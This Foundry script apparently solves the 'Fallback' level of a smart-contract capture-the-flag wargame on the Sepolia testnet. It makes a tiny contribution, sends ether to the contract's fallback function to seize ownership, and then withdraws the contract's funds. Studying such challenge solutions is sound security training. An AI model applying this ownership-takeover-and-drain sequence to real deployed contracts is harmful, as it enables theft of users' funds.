// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level1.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level1Sol is Script{
    
    Fallback public level1 = Fallback(payable(0x6318e52C6f116694A9b99761BdbC96faE1ad5B4E));//pass the contract address deployed on the sepolia testnet
    function run() external{
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        level1.contribute{value: 1 wei}();
        address(level1).call{value: 1 wei}("");
        console.log("New owner:",level1.owner());
        console.log("My address:",vm.envAddress("MY_ADDRESS"));

        //once we became the owner of the contract, we can now withdraw

        level1.withdraw();

        vm.stopBroadcast();
    }
}